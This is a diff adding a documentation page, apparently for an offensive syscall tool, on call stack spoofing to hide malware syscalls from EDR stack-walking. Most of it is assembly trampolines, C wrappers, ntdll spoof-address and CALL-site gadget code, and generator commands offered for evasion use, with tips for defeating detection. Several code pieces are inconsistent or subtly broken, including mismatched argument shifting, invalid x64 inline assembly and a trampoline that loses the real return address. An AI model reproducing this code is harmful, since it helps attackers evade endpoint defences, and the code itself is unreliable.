@@ -1,0 +1,473 @@
+---
+title: 'Call Stack Spoofing'
+description: 'Forge synthetic return addresses to evade stack-walking EDR detection'
+icon: 'layer-group'
+---
+
+## Overview
+
+Call Stack Spoofing is a technique that manipulates the visible call stack to make syscalls appear to originate from legitimate Windows code (e.g., `ntdll.dll`), defeating EDR stack-walking heuristics. By replacing the real return address with a synthetic pointer into ntdll before executing a syscall, we hide the fact that execution came from suspicious code.
+
+<Warning>
+**Target audience**: Advanced users familiar with x64 calling conventions, stack frames, and return address chains.
+</Warning>
+
+## The Problem: Stack Walking EDRs
+
+### How EDRs Analyze Call Stacks
+
+Modern EDRs inspect the **call stack** when suspicious operations occur:
+
+```
+Stack frame analysis at syscall entry:
+
+#0  ntdll!NtAllocateVirtualMemory  ← Syscall
+#1  malware.exe!0x401234            ← Return address (RWX shellcode region)
+#2  malware.exe!0x403ABC            ← Another suspicious frame
+#3  kernel32!BaseThreadInitThunk
+```
+
+**EDR heuristic**: If the return address points into:
+- Non-module memory (shellcode)
+- Unbacked memory regions (reflectively loaded DLLs)
+- Executable heaps (JIT code)
+- Known malicious modules
+
+→ **Alert/Block** the operation
+
+### Stack-Walking APIs
+
+EDRs use these techniques to walk the stack:
+
+1. **RtlCaptureStackBackTrace** (Windows API)
+2. **Manual RBP chain walking** (read `[rbp]`, `[rbp+8]`, etc.)
+3. **Exception context analysis** (`CONTEXT.Rsp`, unwind info)
+4. **ETW stack traces** (kernel-mode `Microsoft-Windows-Threat-Intelligence`)
+
+## How Stack Spoofing Works
+
+### Core Idea
+
+Replace the **return address** on the stack with a pointer into a legitimate module (ntdll.dll) before the syscall:
+
+```
+Before spoofing:
+    RSP → [Real Return Addr: malware.exe!0x401234]  ← Suspicious!
+          [Frame data...]
+
+After spoofing:
+    RSP → [Fake Return Addr: ntdll!LdrInitializeThunk]  ← Looks legitimate
+          [Real Return Addr: malware.exe!0x401234]  ← Hidden one frame deeper
+          [Frame data...]
+```
+
+When EDR walks the stack, it sees:
+
+```
+#0  ntdll!NtAllocateVirtualMemory
+#1  ntdll!LdrInitializeThunk       ← Spoofed — looks like normal loader activity
+```
+
+**Result**: Stack appears to originate from ntdll, not suspicious code.
+
+## Implementation Approaches
+
+### Approach 1: Trampoline Function (Recommended)
+
+Use a small assembly trampoline that swaps return addresses:
+
+```asm
+; SW4_CallWithSpoofedStack(target_func, spoof_addr, ...args)
+SW4_CallWithSpoofedStack PROC
+    ; Arguments:
+    ;   RCX = Target function address (e.g., SW4_NtAllocateVirtualMemory)
+    ;   RDX = Spoof return address (e.g., ntdll!LdrInitializeThunk)
+    ;   R8, R9, [stack] = Actual function arguments
+    
+    pop  r11                     ; Pop real return address into R11
+    push rdx                     ; Push spoofed address onto stack
+    push r11                     ; Push real address below it
+    
+    ; Shift arguments:
+    ;   RCX (target) → RAX (call target)
+    ;   RDX (spoof) → not needed anymore
+    ;   R8 → RCX (arg1)
+    ;   R9 → RDX (arg2)
+    ;   Stack args → shift up
+    
+    mov  rax, rcx                ; RAX = target function
+    mov  rcx, r8                 ; Shift arg1
+    mov  rdx, r9                 ; Shift arg2
+    mov  r8,  QWORD PTR [rsp+18h] ; Shift arg3 from stack
+    mov  r9,  QWORD PTR [rsp+20h] ; Shift arg4 from stack
+    
+    ; Adjust stack pointer to skip real return address
+    add  rsp, 8                  ; Skip the hidden real address
+    
+    jmp  rax                     ; Jump to target (return goes to spoofed address)
+SW4_CallWithSpoofedStack ENDP
+```
+
+### Approach 2: Inline Stack Manipulation
+
+Manually manipulate the stack in C with inline assembly:
+
+```c
+void* real_return_addr;
+void* spoof_addr = GetSpoofAddress();  // ntdll function pointer
+
+__asm {
+    pop  real_return_addr        // Save real return address
+    push spoof_addr              // Push spoofed address
+    push real_return_addr        // Push real address below
+}
+
+// Call target function
+SW4_NtAllocateVirtualMemory(...);
+
+__asm {
+    add  rsp, 8                  // Clean up extra frame
+}
+```
+
+### Approach 3: Gadget-Based (Advanced)
+
+Find ROP gadgets in ntdll to perform the swap:
+
+```
+Gadget 1: pop rax ; ret          (at ntdll+0x12345)
+Gadget 2: push rax ; jmp rcx     (at ntdll+0x67890)
+```
+
+**Flow**:
+1. Push spoof address
+2. Push real return address
+3. Use gadgets to rearrange stack
+4. Jump to target
+
+## Choosing a Spoof Address
+
+### Requirements
+
+1. **Inside ntdll.dll**: Must be a legitimate module (EDR whitelist)
+2. **Executable**: Must point to valid code (prevents AVs)
+3. **Innocuous context**: Avoid suspicious functions like `RtlUserThreadStart` (common in thread injection)
+
+### Good Candidates
+
+```c
+// Safe, commonly called ntdll functions:
+void* spoof_addresses[] = {
+    GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrInitializeThunk"),
+    GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart"),
+    GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrLoadDll"),
+    GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAllocateHeap"),
+};
+
+// Random selection for diversity
+void* GetSpoofAddress() {
+    int idx = (__rdtsc() ^ GetTickCount()) % 4;
+    return spoof_addresses[idx];
+}
+```
+
+### Finding Spoof Addresses Dynamically
+
+```c
+PVOID FindSpoofAddressInNtdll(void) {
+    PVOID pNtdll = GetModuleHandleA("ntdll.dll");
+    if (!pNtdll) return NULL;
+    
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + dos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exports = 
+        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdll + 
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    
+    PDWORD funcRvas = (PDWORD)((PBYTE)pNtdll + exports->AddressOfFunctions);
+    
+    // Pick a random export
+    DWORD idx = __rdtsc() % exports->NumberOfFunctions;
+    return (PVOID)((PBYTE)pNtdll + funcRvas[idx]);
+}
+```
+
+## Full Implementation
+
+### MASM Assembly (x64)
+
+```asm
+; SW4Syscalls.asm
+.CODE
+
+EXTERN SW4_SpoofReturnAddr:QWORD  ; Cached spoof address (set in C)
+
+; Trampoline: Call target with spoofed return address
+; RCX = target function address
+; RDX-R9, stack = function arguments (already in place)
+SW4_CallWithSpoofedStack PROC
+    pop  r11                              ; Save real return address
+    push QWORD PTR [SW4_SpoofReturnAddr]  ; Push spoofed ntdll address
+    push r11                              ; Push real return (hidden)
+    
+    ; Target is in RCX — move to RAX for indirect jump
+    mov  rax, rcx
+    
+    ; Shift arguments left (RCX was target, now needs to be arg1)
+    mov  rcx, rdx                         ; arg1 ← RDX
+    mov  rdx, r8                          ; arg2 ← R8
+    mov  r8,  r9                          ; arg3 ← R9
+    mov  r9,  QWORD PTR [rsp+20h]         ; arg4 ← stack
+    
+    ; Adjust stack past hidden real return address
+    add  rsp, 8
+    
+    jmp  rax  ; Call target — returns to spoofed address
+SW4_CallWithSpoofedStack ENDP
+
+END
+```
+
+### C Wrapper
+
+```c
+// SW4Syscalls.c
+
+// Global: cached spoof address
+PVOID SW4_SpoofReturnAddr = NULL;
+
+// Extern: assembly trampoline
+EXTERN_C NTSTATUS SW4_CallWithSpoofedStack(
+    PVOID TargetFunc,
+    ...  // Actual function arguments
+);
+
+// Initialize spoof address
+BOOL SW4_InitStackSpoof(void) {
+    PVOID pNtdll = GetModuleHandleA("ntdll.dll");
+    if (!pNtdll) return FALSE;
+    
+    // Use LdrInitializeThunk (common, safe)
+    SW4_SpoofReturnAddr = GetProcAddress(pNtdll, "LdrInitializeThunk");
+    return SW4_SpoofReturnAddr != NULL;
+}
+
+// Example: NtAllocateVirtualMemory with spoofed stack
+NTSTATUS SW4_NtAllocateVirtualMemory_Spoofed(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+) {
+    // Pointer to actual syscall stub
+    extern NTSTATUS SW4_NtAllocateVirtualMemory(
+        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
+    );
+    
+    // Call via trampoline
+    return SW4_CallWithSpoofedStack(
+        (PVOID)SW4_NtAllocateVirtualMemory,
+        ProcessHandle,
+        BaseAddress,
+        ZeroBits,
+        RegionSize,
+        AllocationType,
+        Protect
+    );
+}
+```
+
+## Usage
+
+### Enable Stack Spoofing in Generation
+
+```bash
+# Generate with stack spoofing support
+python syswhispers.py --preset injection --stack-spoof
+
+# Combine with other evasion techniques
+python syswhispers.py --preset stealth \
+    --resolve freshycalls \
+    --method randomized \
+    --stack-spoof \
+    --obfuscate
+```
+
+### Integration Example
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    // Initialize SysWhispers4
+    SW4_Initialize();
+    
+    // Initialize stack spoofing
+    if (!SW4_InitStackSpoof()) {
+        fprintf(stderr, "[!] Stack spoofing init failed\n");
+        return 1;
+    }
+    
+    printf("[+] Stack spoofing enabled\n");
+    
+    // Use spoofed syscalls
+    PVOID base = NULL;
+    SIZE_T size = 0x1000;
+    
+    NTSTATUS st = SW4_NtAllocateVirtualMemory_Spoofed(
+        GetCurrentProcess(),
+        &base,
+        0,
+        &size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    
+    if (NT_SUCCESS(st)) {
+        printf("[+] Memory allocated at 0x%p (stack spoofed)\n", base);
+    }
+    
+    return 0;
+}
+```
+
+## Advantages
+
+<CardGroup cols={2}>
+  <Card title="Defeats Stack Walking" icon="shield">
+    EDR stack traces show legitimate ntdll → ntdll call chains
+  </Card>
+  <Card title="Low Overhead" icon="gauge-high">
+    Minimal performance cost (few extra instructions per call)
+  </Card>
+  <Card title="Transparent" icon="eye-slash">
+    Drop-in replacement for regular syscalls
+  </Card>
+  <Card title="Flexible" icon="shuffle">
+    Can randomize spoof addresses per call for diversity
+  </Card>
+</CardGroup>
+
+## Limitations
+
+### 1. Deep Stack Inspection
+
+Sophisticated EDRs may walk **beyond** the first frame:
+
+```
+#0  ntdll!NtAllocateVirtualMemory
+#1  ntdll!LdrInitializeThunk        ← Spoofed
+#2  malware.exe!0x401234             ← Real origin (still visible!)
+```
+
+**Mitigation**: Stack spoofing only hides the immediate caller. For full obfuscation, use **multi-layer spoofing** (replace multiple frames).
+
+### 2. Return Address Validation
+
+Some EDRs validate that return addresses point to valid **CALL sites**:
+
+```asm
+; Spoofed address: ntdll!LdrInitializeThunk
+; EDR checks: is there a CALL instruction before this address?
+ntdll!LdrInitializeThunk:
+    mov  r10, rcx   ← Not preceded by CALL — suspicious!
+```
+
+**Mitigation**: Use return address gadgets:
+
+```c
+// Find address preceded by E8 (CALL) in ntdll
+PVOID FindCallSite(PVOID pNtdll, SIZE_T size) {
+    for (PBYTE p = (PBYTE)pNtdll; p < (PBYTE)pNtdll + size - 5; p++) {
+        if (p[0] == 0xE8) {  // CALL rel32
+            return p + 5;     // Return address after CALL
+        }
+    }
+    return NULL;
+}
+```
+
+### 3. Kernel-Mode ETW
+
+**ETW-Ti** (Threat Intelligence) stack traces are captured **in the kernel** before user-mode spoofing occurs. No user-mode technique can hide from ETW-Ti.
+
+### 4. Complexity
+
+Stack manipulation is error-prone:
+- Wrong offsets → crashes
+- Misaligned stacks → access violations
+- Calling convention mismatches → corrupted arguments
+
+## Detection Vectors
+
+### Observable Behaviors
+
+1. **Stack anomalies**: Return addresses that don't match CALL sites
+2. **Performance**: Extra stack operations may be visible via timing
+3. **Memory patterns**: Trampoline code in .text section
+
+### EDR Telemetry
+
+```
+[Syscall Entry: NtAllocateVirtualMemory]
+Stack trace:
+  #0 ntdll!NtAllocateVirtualMemory
+  #1 ntdll!LdrInitializeThunk  ← Spoof address
+  #2 malware.exe+0x1234         ← Real origin
+
+Heuristic: Return address #1 not preceded by CALL instruction → ALERT
+```
+
+### Mitigation Strategies
+
+<Steps>
+  <Step title="Use CALL-site gadgets">
+    Ensure spoof addresses are valid return sites:
+    ```c
+    SW4_SpoofReturnAddr = FindCallSiteInNtdll();
+    ```
+  </Step>
+
+  <Step title="Randomize spoof addresses">
+    Different address per call:
+    ```c
+    void* spoofs[] = { addr1, addr2, addr3, addr4 };
+    SW4_SpoofReturnAddr = spoofs[__rdtsc() % 4];
+    ```
+  </Step>
+
+  <Step title="Combine with indirect invocation">
+    Keep RIP inside ntdll during syscall:
+    ```bash
+    python syswhispers.py --stack-spoof --method randomized
+    ```
+  </Step>
+</Steps>
+
+## Comparison with Alternatives
+
+| Technique | Hides Immediate Caller | Hides Deep Frames | Kernel Visibility | Complexity |
+|-----------|:----------------------:|:-----------------:|:-----------------:|:----------:|
+| **Stack Spoofing** | ✅ | ❌ | ❌ (ETW-Ti) | Medium |
+| No Evasion | ❌ | ❌ | ✅ | Low |
+| ROP Chains | ✅ | ⚠️ Partial | ❌ | Very High |
+| Thread Hijacking | ✅ | ✅ | ⚠️ Partial | High |
+
+## Further Reading
+
+<CardGroup cols={2}>
+  <Card title="WithSecure Research" icon="link" href="https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs">
+    Original call stack spoofing research
+  </Card>
+  <Card title="Indirect Invocation" icon="paper-plane" href="/concepts/invocation-methods#indirect">
+    Combine with indirect syscalls for layered evasion
+  </Card>
+  <Card title="RecycledGate" icon="recycle" href="/advanced/recycled-gate">
+    SSN resolution technique for maximum hook resistance
+  </Card>
+  <Card title="Sleep Encryption" icon="moon" href="/advanced/sleep-encryption">
+    Complement with memory obfuscation during idle
+  </Card>
+</CardGroup>
